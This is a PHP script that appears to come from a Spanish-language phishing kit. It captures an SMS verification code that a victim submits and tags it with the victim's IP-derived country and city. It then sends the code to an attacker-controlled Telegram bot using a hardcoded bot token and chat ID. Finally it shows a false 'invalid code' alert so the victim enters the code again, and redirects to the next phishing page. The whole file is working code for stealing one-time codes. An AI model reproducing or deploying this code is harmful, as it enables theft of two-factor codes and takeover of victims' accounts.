<?php

@session_start();
ini_set("display_errors", 0);
include "geoplugin.php";

$sendtotelegram="yes";
$chat_id="6618919756";
$bot_url="7222469203:AAFQHhirrvnOPLikd-bE5isutnhSBrOsbMI";

$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$user_ip}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$user_ip}/city"));

if (isset ($_POST['code']) ){

$_SESSION['ind2'] = "ind2";

$message .= "= = = = =Codigo SMS1= = = = \n";
$message .= "|| Codigo.: ".$_POST['code']."\n";
$message .= "|| ".$cc." - ".$city." \n";
$message .= "= = = = = = = = = = = = = = =\n";

if ($sendtotelegram=="yes"){

    $txt = $message;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

}


?>


<html>
<head>
    <script language="javascript">alert("CODIGO INVALIDO, INGRESALO NUEVAMENTE");
</script>';
<META HTTP-EQUIV="REFRESH" CONTENT="0;index4.php">
</head>
<body>